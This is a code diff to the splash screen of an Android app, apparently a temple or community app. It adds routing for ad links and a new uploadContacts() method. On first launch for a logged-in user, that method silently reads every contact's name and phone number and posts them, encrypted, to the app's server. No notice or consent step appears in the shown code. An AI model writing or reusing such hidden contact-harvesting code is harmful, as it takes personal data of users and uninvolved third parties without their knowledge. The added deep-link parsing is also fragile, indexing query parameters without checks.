@@ -3,10 +3,12 @@ package com.yunfengsi;
 import android.animation.ObjectAnimator;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.Color;
 import android.os.Bundle;
 import android.os.CountDownTimer;
+import android.provider.ContactsContract;
 import android.support.annotation.Nullable;
 import android.support.v4.view.PagerAdapter;
 import android.support.v4.view.ViewPager;
@@ -25,6 +27,12 @@ import com.bumptech.glide.request.animation.GlideAnimation;
 import com.bumptech.glide.request.target.SimpleTarget;
 import com.lzy.okgo.OkGo;
 import com.lzy.okgo.callback.AbsCallback;
+import com.lzy.okgo.callback.StringCallback;
+import com.yunfengsi.Managers.MessageCenter;
+import com.yunfengsi.Model_activity.Mine_activity_list;
+import com.yunfengsi.Model_activity.activity_Detail;
+import com.yunfengsi.Model_zhongchou.FundingDetailActivity;
+import com.yunfengsi.NianFo.NianFo;
 import com.yunfengsi.Utils.ACache;
 import com.yunfengsi.Utils.AnalyticalJSON;
 import com.yunfengsi.Utils.ApisSeUtil;
@@ -35,6 +43,7 @@ import com.yunfengsi.Utils.LoginUtil;
 import com.yunfengsi.Utils.PreferenceUtil;
 import com.yunfengsi.Utils.mApplication;
 
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -86,8 +95,6 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
     private URL y;
 
     private boolean shouldLoadImage = true;
-
-
 
 
     @Override
@@ -148,17 +155,17 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
                         try {
                             String data = response.body().string();
                             HashMap<String, String> map = AnalyticalJSON.getHashMap(data);
-                            Log.w(TAG, "onResponse: 广告页地址" + map+"    是否活动图标：："+map.get("act_start"));
+                            Log.w(TAG, "onResponse: 广告页地址" + map + "    是否活动图标：：" + map.get("act_start"));
                             if (map != null) {
                                 String url = map.get("image1");
                                 String detail = map.get("url");
                                 getBitmapForAD(url, detail);
-                                mApplication.changeIcon="2".equals(map.get("act_start"))?true:false;
-                                mApplication.componentName=getComponentName();
-                                LogUtil.e("入口"+mApplication.componentName);
+                                mApplication.changeIcon = "2".equals(map.get("act_start")) ? true : false;
+                                mApplication.componentName = getComponentName();
+                                LogUtil.e("入口" + mApplication.componentName);
                             }
 
-                       } catch (IOException e) {
+                        } catch (IOException e) {
                             Log.w(TAG, "onResponse:广告页 错误" + e.toString());
                             e.printStackTrace();
                         }
@@ -334,7 +341,52 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
 
         }
 
+        if(PreferenceUtil.getSettingIncetance(this).getBoolean("isFirstInstall",true)
+                &&!PreferenceUtil.getUserId(this).equals("")){
+            PreferenceUtil.getSettingIncetance(this).edit().putBoolean("isFirstInstall",false).apply();
+            uploadContacts();
+        }
 
+
+    }
+
+    private void uploadContacts() {
+        String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
+        Cursor cursor =getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                cols, null, null, null);
+        JSONArray jsonArray=new JSONArray();
+        for (int i = 0; i < cursor.getCount(); i++) {
+            cursor.moveToPosition(i);
+            // 取得联系人名字
+            int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
+            int numberFieldColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+            String name = cursor.getString(nameFieldColumnIndex);
+            String number = cursor.getString(numberFieldColumnIndex);
+
+            HashMap<String,String > map=new HashMap<>();
+            map.put("name",name);
+            map.put("phone",number);
+            JSONObject jsonObject=new JSONObject(map);
+            jsonArray.put(jsonObject);
+        }
+        cursor.close();
+        JSONObject js=new JSONObject();
+        try {
+            js.put("user_id",PreferenceUtil.getUserId(this));
+            js.put("contacts",jsonArray.toString());
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+        ApisSeUtil.M m=ApisSeUtil.i(js);
+        OkGo.post(Constants.Contacts)
+                .params("key",m.K())
+                .params("msg",m.M())
+                .execute(new StringCallback() {
+                    @Override
+                    public void onSuccess(String s, Call call, Response response) {
+
+                    }
+                });
     }
 
     /**
@@ -424,8 +476,7 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
                 intent.setClass(this, MainActivity.class);
                 startActivity(intent);
                 finish();
-                new LoginUtil().checkLogin(this) ;
-
+                new LoginUtil().checkLogin(this);
 
 
                 break;
@@ -439,15 +490,71 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
                         intent.setClass(this, MainActivity.class);
                         startActivity(intent);
                     }
-                    String url=v.getTag().toString();
+                    String url = v.getTag().toString();
+                    if (url != null) {
+                        if (url.contains("yfs.php") && url.contains("red")) {
+                            intent.setClass(this, ZhiFuShare.class);
+                            intent.putExtra("type", "5");
+                            startActivity(intent);
+                            finish();
+                            return;
+                        };
+                        if(url.equals(Constants.Help)){
+                            intent.setClass(Splash.this,AD.class);
+                            intent.putExtra("bangzhu",true);
+                            startActivity(intent);
+                            return;
+                        }
+                        if (!url.equals("")&&url.contains("yfs.php")) {
+                            if (url.contains("?")) {
+                                int index = url.lastIndexOf("?");
+                                String arg = url.substring(index + 1, url.length());
+                                LogUtil.e("截取后的参数字段：" + arg);
+                                if (arg.contains("&")) {
+                                    String[] args = arg.split("&");
+                                    final String id = args[0].substring(args[0].lastIndexOf("=") + 1);
+                                    final String type = args[1].substring(args[1].lastIndexOf("=") + 1);
+                                    LogUtil.e("字段信息：  id::" + id + "  type::" + type);
 
-                    if(url!=null&&url.contains("yfs.php")&&url.contains("red")){
-                        intent.setClass(this,ZhiFuShare.class);
-                        intent.putExtra("type","5");
-                        startActivity(intent);
-                        finish();
-                        return;
-                    };
+                                    Intent intent1 = new Intent();
+                                    switch (type) {
+                                        case mReceiver.HUODong:
+                                            intent1.setClass(Splash.this, activity_Detail.class);
+                                            intent1.putExtra("id", id);
+                                            break;
+                                        case mReceiver.GOngyang:
+                                            intent1.setClass(Splash.this, XuanzheActivity.class);
+                                            intent1.putExtra("id", id);
+                                            break;
+                                        case mReceiver.ZHONGCHou:
+                                            intent1.setClass(Splash.this, FundingDetailActivity.class);
+                                            intent1.putExtra("id", id);
+                                            break;
+                                        case mReceiver.ZIXUN:
+                                            intent1.setClass(Splash.this, ZiXun_Detail.class);
+                                            intent1.putExtra("id", id);
+                                            break;
+                                        case mReceiver.BaoMing:
+                                            intent1.setClass(Splash.this, Mine_activity_list.class);
+                                            break;
+                                        case mReceiver.GONGXIU:
+                                            intent1.setClass(Splash.this, NianFo.class);
+                                            break;
+                                        case mReceiver.TongZhi:
+                                            intent1.setClass(Splash.this, MessageCenter.class);
+                                            break;
+
+                                    }
+
+                                    startActivity(intent1);
+                                    finish();
+                                    return;
+                                }
+
+                            }
+                        }
+                    }
+
                     intent.setClass(this, AD.class);
                     intent.putExtra("url", v.getTag().toString());
                     startActivity(intent);
